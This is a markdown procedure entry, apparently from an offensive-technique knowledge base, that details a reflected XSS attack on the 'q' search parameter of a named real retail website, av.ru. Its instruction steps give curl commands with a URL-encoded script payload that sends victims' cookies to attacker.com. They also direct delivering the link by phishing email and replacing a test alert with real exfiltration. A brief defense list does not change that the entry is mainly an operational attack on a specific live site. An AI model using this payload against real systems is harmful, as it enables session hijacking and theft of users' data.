---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Inject-XSS-Payload-into-q-Parameter
tags:
  - xss
  - reflected-xss
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-inject-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:33.416Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-q-Parameter

## Summary

This procedure exploits a reflected XSS vulnerability in the 'q' search parameter on https://av.ru/collections/* by injecting a JavaScript payload that executes in the victim's browser, allowing theft of session cookies or other sensitive data.

## Description

The Azbuka Vkusa website (av.ru) reflects user input from the 'q' parameter directly into the HTML response without proper sanitization or encoding, enabling attackers to inject malicious scripts. In a real attack, the payload is delivered via a crafted URL shared through phishing or social engineering. Upon loading, the script runs in the context of the victim's session, potentially hijacking authentication or exfiltrating data to an attacker-controlled server. This medium-severity issue (CVSS 4.7) requires no authentication but relies on victim interaction.

## Requirements

1. Public access to https://av.ru/collections/* over HTTPS
2. Control of an external server to receive exfiltrated data (e.g., for cookie theft)
3. Basic knowledge of JavaScript and URL encoding

## Defense

Defensive measures and detection strategies:

- Implement output encoding (e.g., HTML entity encoding) for all user inputs reflected in HTML
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript execution or unexpected redirects in web logs
- Employ Web Application Firewall (WAF) rules to block common XSS payloads

## Objectives

1. Execute arbitrary JavaScript in the victim's browser context
2. Steal session cookies or other DOM-accessible data
3. Demonstrate potential for phishing or account takeover

## Instructions

### Step 1: Craft the Malicious Payload

**Context**: Encode a JavaScript payload that exfiltrates cookies to an attacker server, ensuring it bypasses any basic filters by using simple script tags.

**Command** ([[commands/curl-inject-xss]]):
```bash
curl "https://av.ru/collections/some-category?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent(document.cookie)%3B%3C%2Fscript%3E" -v
```

> This sends a GET request with the URL-encoded payload. The -v flag shows verbose output, including the response headers and body. Look for the unescaped <script> tag in the HTML response to confirm reflection.

### Step 2: Deliver and Verify Execution

**Context**: Share the crafted URL with the victim (e.g., via email) and monitor the attacker server for incoming data.

**Command** ([[commands/curl-inject-xss]]):
```bash
curl "https://av.ru/collections/some-category?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E" --user-agent "Victim Browser"
```

> Test locally first; replace alert with actual exfiltration. Successful execution shows an alert popup or data on the attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
